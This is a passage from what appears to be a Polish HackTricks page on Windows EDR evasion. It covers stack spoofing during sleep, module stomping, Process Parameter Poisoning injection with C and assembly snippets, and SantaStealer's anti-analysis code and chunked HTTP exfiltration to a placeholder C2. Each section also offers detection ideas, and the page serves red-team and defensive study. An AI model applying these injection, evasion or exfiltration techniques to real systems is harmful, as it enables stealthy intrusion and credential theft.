- Przechowuj stan łańcucha na stercie zamiast na stosie wątku pomocniczego, aby uniknąć wyczerpania domyślnego stosu wątku o rozmiarze 64 KB.
- Użyj `NtSignalAndWaitForSingleObject`, aby atomowo zasygnalizować zdarzenie startowe i zablokować wątek.
- Zawieś główny wątek przed przywróceniem TIB/kontekstu (`NtSuspendThread` → przywrócenie → `NtResumeThread`), aby skrócić okno wyścigu, w którym skaner mógłby wykryć częściowo przywrócony stos.

Zastępuje to sygnaturę `CreateTimerQueueTimer` + `NtContinue` sygnaturą wątku pomocniczego/APC, zachowując te same cele maskowania RC4 i spoofingu stosu.

Dodatkowe pomysły na wykrywanie
- `NtSetInformationVirtualMemory` z `VmCfgCallTargetInformation` tuż przed snem, oczekiwaniem lub wysłaniem APC.
- `GetThreadContext`/`SetThreadContext` używane wokół `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` lub `ConnectNamedPipe`.
- `NtQueryInformationThread`, po którym następują bezpośrednie zapisy do granic stosu TEB/TIB bieżącego wątku.
- Łańcuchy `NtQueueApcThread`/`NtAlertResumeThread` pośrednio wywołujące `SystemFunction032`, `VirtualProtect` lub pomocnicze funkcje przywracające uprawnienia sekcji.
- Wielokrotne użycie krótkich sygnatur gadżetów, takich jak `FF 23` (`jmp [rbx]`) lub `FF E7` (`jmp rdi`), jako punktów przesiadkowych dyspozytora w podpisanych modułach.


## Precision Module Stomping

Module stomping uruchamia payloady z **sekcji `.text` DLL-a już zamapowanego w procesie docelowym**, zamiast przydzielać oczywistą prywatną pamięć wykonywalną lub ładować nowy, ofiarny DLL. Celem nadpisania powinien być **załadowany obraz oparty na pliku na dysku**, którego obszar kodu pomieści payload bez uszkadzania ścieżek kodu nadal potrzebnych procesowi.<sup>[[1]](#references)[[2]](#references)</sup>

### Niezawodny wybór celu

Naiwne stompowanie popularnych modułów, takich jak `uxtheme.dll` lub `comctl32.dll`, jest zawodne: DLL może nie być załadowany w zdalnym procesie, a zbyt mały obszar kodu może spowodować awarię procesu. Bardziej niezawodny przebieg pracy wygląda następująco:

1. Wylicz moduły procesu docelowego i zachowaj **listę dozwolonych nazw** już załadowanych DLL-i.
2. Najpierw zbuduj payload i zapisz jego **dokładny rozmiar w bajtach**.
3. Przeskanuj DLL-e na dysku i porównaj rozmiar sekcji PE **`.text` `Misc_VirtualSize`** z rozmiarem payloadu. To ważniejsze niż rozmiar pliku, ponieważ odzwierciedla rozmiar sekcji wykonywalnej **po zamapowaniu w pamięci**.
4. Przeanalizuj **Export Address Table (EAT)** i wybierz RVA eksportowanej funkcji jako początkowy offset stompowania.
5. Oblicz **zasięg uszkodzeń**: jeśli payload przekroczy granicę wybranej funkcji, nadpisze sąsiednie eksporty ułożone za nią w pamięci.

Typowe narzędzia pomocnicze do rekonesansu/wyboru celu spotykane w praktyce:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Uwagi operacyjne
- Preferuj DLL-e **już załadowane** w zdalnym procesie, aby uniknąć telemetryki związanej z `LoadLibrary`/nieoczekiwanym ładowaniem obrazów.
- Preferuj exports, które aplikacja docelowa rzadko wykonuje; w przeciwnym razie normalne ścieżki kodu mogą trafić na nadpisane bajty przed utworzeniem wątku lub po nim.
- Duże implanty często wymagają zmiany sposobu osadzania shellcode’u z literału stringowego na **inicjalizator tablicy bajtów/ujęty w nawiasy klamrowe**, aby cały bufor został poprawnie odwzorowany w kodzie injectora.

Pomysły na wykrywanie
- Zdalne zapisy do stron wykonywalnych opartych na obrazie (`MEM_IMAGE`, `PAGE_EXECUTE*`) zamiast częstszych prywatnych alokacji RWX/RX.
- Punkty wejścia exportów, których bajty w pamięci nie są już zgodne z plikiem źródłowym na dysku.
- Zdalne wątki lub zmiany kontekstu, których wykonywanie rozpoczyna się wewnątrz eksportu legalnej biblioteki DLL, którego pierwsze bajty zostały niedawno zmodyfikowane.
- Podejrzane sekwencje `VirtualProtect(Ex)` / `WriteProcessMemory` wykonywane na stronach `.text` bibliotek DLL, po których następuje utworzenie wątku.

## Zatruwanie parametrów procesu (P3)

Process Parameter Poisoning (P3) to technika **wstrzykiwania do procesu / omijania EDR**, która pozwala uniknąć klasycznej ścieżki zdalnego zapisu (`VirtualAllocEx` + `WriteProcessMemory`). Zamiast kopiować bajty do już uruchomionego procesu docelowego, wykorzystuje fakt, że Windows **kopiuje wybrane parametry startowe `CreateProcessW` do procesu potomnego** i przechowuje je w `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Nośniki podatne na zatrucie, kopiowane przez `CreateProcessW`

Przydatne nośniki to:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (z `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Ograniczenia dotyczące nośników w praktyce:

- `lpCommandLine` musi wskazywać **pamięć z prawem zapisu**, aby `CreateProcessW` mogła z niej korzystać, i jest ograniczone do **32 767 znaków Unicode**, łącznie z terminatorem null.
- `lpEnvironment` musi być blokiem środowiska Unicode złożonym z kolejnych ciągów `NAME=VALUE\0`, zakończonych dodatkowym `\0`.
- `lpReserved` jest oficjalnie zarezerwowane, dlatego mapowanie `ShellInfo` należy traktować jako szczegół implementacyjny, a nie stabilny, udokumentowany kontrakt.

Dzięki temu zwykłe tworzenie procesu staje się **mechanizmem transferu payloadu**. Operator tworzy proces potomny z danymi startowymi kontrolowanymi przez atakującego i pozwala Windows wykonać kopię między procesami.

### Przepływ zdalnego wyszukiwania bez zdalnych API zapisu

Po utworzeniu procesu potomnego rozwiąż lokalizację skopiowanego bufora za pomocą prymitywów **wyłącznie do odczytu**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pobierz `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Odczytaj zdalny `PEB`
3. Przejdź do `PEB.ProcessParameters`
4. Odczytaj `RTL_USER_PROCESS_PARAMETERS`
5. Użyj wybranego wskaźnika:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimalny przepływ:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Wykonywanie skopiowanego bufora parametrów

Skopiowany obszar parametrów ma zwykle uprawnienia `RW`, a nie wykonywalne. Typowy łańcuch P3 wygląda następująco:

1. Utwórz proces normalnie (nie w stanie wstrzymania)
2. Ustaw stronę wybranych parametrów jako wykonywalną za pomocą `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponownie użyj uchwytu głównego wątku zwróconego już w `PROCESS_INFORMATION`
4. Przekieruj wykonanie za pomocą `NtSetContextThread` (`CONTEXT_CONTROL`, nadpisz `RIP`)

W przeciwieństwie do klasycznych procedur przejmowania wątków **nie wymaga to** `SuspendThread` / `ResumeThread`; kontekst można zmienić bezpośrednio za pomocą zwróconego uchwytu głównego wątku.

Pozwala to uniknąć kilku API często monitorowanych pod kątem wstrzykiwania:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- często również `SuspendThread` / `ResumeThread`

### Ograniczenie związane z bajtem null i etapowy shellcode

Wszystkie trzy nośniki to **dane tekstowe lub podobne do tekstu**, więc surowy payload zawierający `0x00` zostaje obcięty podczas przesyłania. Praktycznym rozwiązaniem jest **pierwszy etap bez bajtów null**, który odtwarza stałe w czasie działania, a następnie ładuje dowolny drugi etap.

Prosty wzorzec polega na syntezie stałych z użyciem XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

To pozwala pierwszemu etapowi budować ciągi na stosie, argumenty API, ścieżki DLL lub loader shellcode drugiego etapu bez umieszczania bajtów null w transportowanym parametrze.

### Wywołania API oparte na stosie z pierwszego etapu

Gdy pierwszy etap musi wywołać API, takie jak `LoadLibraryA`, może:

- umieścić ciąg/bufor na stosie procesu docelowego
- zarezerwować **32-bajtowy shadow space x64**
- ustawić `RCX`, `RDX`, `R8`, `R9` na stałe wartości lub wskaźniki względem `RSP`
- zachować **16-bajtowe wyrównanie** `RSP` przed wywołaniem

Drugi etap można następnie skopiować ze stosu do alokacji `PAGE_READWRITE`, zmienić jej ochronę na `PAGE_EXECUTE_READ` za pomocą `VirtualProtect`, a potem wykonać skok do tego obszaru, unikając bezpośredniej alokacji RWX.

### Pomysły na wykrywanie

Autorzy wskazują następujące obiecujące możliwości w ramach huntingu:

- `VirtualProtectEx` / `NtProtectVirtualMemory` ustawiające strony parametrów procesu jako wykonywalne
- zmiana tych uprawnień, po której następuje `SetThreadContext` / `NtSetContextThread`
- zdalne odczyty `PEB`, a następnie `RTL_USER_PROCESS_PARAMETERS`
- nietypowo długie wartości lub wartości o wysokiej entropii w `lpCommandLine`, `lpEnvironment` lub `STARTUPINFO.lpReserved` podczas tworzenia procesu

### Uwagi

- P3 to **sztuczka do transferu między procesami**, a nie samodzielny, kompletny mechanizm wykonania: skopiowany parametr nadal wymaga zmiany uprawnień na wykonywanie oraz metody przekierowania wykonania.
- Autorzy rozważali `RtlCreateProcessReflection` / Dirty Vanity, ale odrzucili tę metodę, ponieważ wewnętrznie korzysta z podejrzanych prymitywów, takich jak `NtWriteVirtualMemory` i `NtCreateThreadEx`.

## Taktyki SantaStealer służące do unikania wykrycia bez plików i kradzieży danych uwierzytelniających

SantaStealer (znany też jako BluelineStealer) pokazuje, jak współczesne infostealery łączą w jednym procesie omijanie AV, anti-analysis i dostęp do danych uwierzytelniających.<sup>[[24]](#references)</sup>

### Filtrowanie według układu klawiatury i opóźnienie w sandboxie

- Flaga konfiguracji (`anti_cis`) wylicza zainstalowane układy klawiatury za pomocą `GetKeyboardLayoutList`. Jeśli zostanie znaleziony układ cyrylicy, próbka tworzy pusty znacznik `CIS` i kończy działanie przed uruchomieniem stealerów, dzięki czemu nie uruchamia się w wykluczonych lokalizacjach, a jednocześnie pozostawia artefakt przydatny w huntingu.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Warstwowa logika `check_antivm`

- Wariant A przechodzi listę procesów, oblicza dla każdej nazwy niestandardową sumę kontrolną typu rolling i porównuje ją z osadzonymi listami blokowania debuggerów/sandboxów; powtarza obliczanie sumy kontrolnej dla nazwy komputera i sprawdza katalogi robocze, takie jak `C:\analysis`.
- Wariant B sprawdza właściwości systemu (minimalną liczbę procesów, niedawny czas pracy), wywołuje `OpenServiceA("VBoxGuest")`, aby wykryć dodatki VirtualBox, i wykonuje kontrole czasu wokół uśpień, by wykryć wykonywanie krok po kroku. Każde wykrycie przerywa działanie przed uruchomieniem modułów.

### Bezdyskowy helper + podwójne ładowanie reflective z ChaCha20

- Główna biblioteka DLL/plik EXE zawiera helper Chromium do kradzieży danych logowania, który jest zapisywany na dysku lub mapowany ręcznie w pamięci; w trybie bezplikowym samodzielnie rozwiązuje importy/relokacje, więc nie są zapisywane żadne artefakty helpera.
- Helper przechowuje bibliotekę DLL drugiego etapu, dwukrotnie zaszyfrowaną za pomocą ChaCha20 (dwa klucze 32-bajtowe + wartości nonce 12-bajtowe). Po obu przebiegach ładuje blob reflective (bez `LoadLibrary`) i wywołuje eksporty `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` pochodzące z [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Procedury ChromElevator wykorzystują reflective process hollowing oparte na direct-syscall, aby wstrzyknąć kod do działającej przeglądarki Chromium, przejąć klucze AppBound Encryption i odszyfrować hasła/pliki cookie/dane kart kredytowych bezpośrednio z baz SQLite, mimo zabezpieczeń ABE.


### Modularne zbieranie danych w pamięci i eksfiltracja HTTP w częściach

- `create_memory_based_log` przechodzi globalną tablicę wskaźników do funkcji `memory_generators` i uruchamia po jednym wątku dla każdego włączonego modułu (Telegram, Discord, Steam, zrzuty ekranu, dokumenty, rozszerzenia przeglądarki itd.). Każdy wątek zapisuje wyniki we współdzielonych buforach i po około 45-sekundowym oknie `join` zwraca liczbę plików.
- Po zakończeniu wszystko jest kompresowane do `%TEMP%\\Log.zip` za pomocą statycznie dołączonej biblioteki `miniz`. Następnie `ThreadPayload1` usypia na 15 s i przesyła archiwum strumieniowo w częściach po 10 MB przez HTTP POST na `http://<C2>:6767/upload`, podszywając się pod granicę `multipart/form-data` przeglądarki (`----WebKitFormBoundary***`). Każda część zawiera nagłówki `User-Agent: upload`, `auth: <build_id>` i opcjonalnie `w: <campaign_tag>`, a w ostatniej części dodawane jest `complete: true`, aby C2 wiedziało, że składanie archiwum zostało zakończone.

## References

- [1] [Zaawansowane techniki unikania wykrycia: precyzyjne podmienianie modułów](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Stosy wywołań: koniec z bezkarnością malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentacja](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – przykład](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – przykład](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – podszywanie się pod stos wywołań PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nowy łańcuch infekcji i zaciemnianie kodu oparte na ConfuserEx w przypadku DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Czy można ufać zasadzie zero trust? Omijanie kontroli stanu urządzeń Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Przed ToolShell: analiza wcześniejszych operacji ransomware grupy Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: nadużywanie eksportów przekazywanych dalej](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inwentarz eksportów przekazywanych dalej w Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Kolejność wyszukiwania bibliotek DLL](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Zabezpieczenia procesów i prawa dostępu](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – dokumentacja EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Program uruchamiający CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Zwalczanie EDR z wykorzystaniem Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Przełamywanie osłony Windows Defender za pomocą techniki przekierowania folderów](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – dokumentacja polecenia mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Za zasłoną Pure: od RAT-a przez builder do kodera](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer nadchodzi: nowy, ambitny infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – odszyfrowywanie Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: zwalczanie malware Node.js za pomocą śledzenia API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Śpiąca Królewna: usypianie Adaptix za pomocą Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – zatruwanie parametrów procesu](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Śpiąca Królewna II: CFG, CET i podszywanie się pod stos](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Obfuskacja uśpienia Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Ukrywanie ETW w .NET](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Nadużywanie Chrome Remote Desktop w operacjach Red Team: praktyczny przewodnik](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: wykorzystanie sterownika naprawczego Defendera jako prymitywu operacji na jądrze](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Kod towarzyszący MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: tworzenie funkcji samomaskujących przy użyciu LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
{{#include ../banners/hacktricks-training.md}}
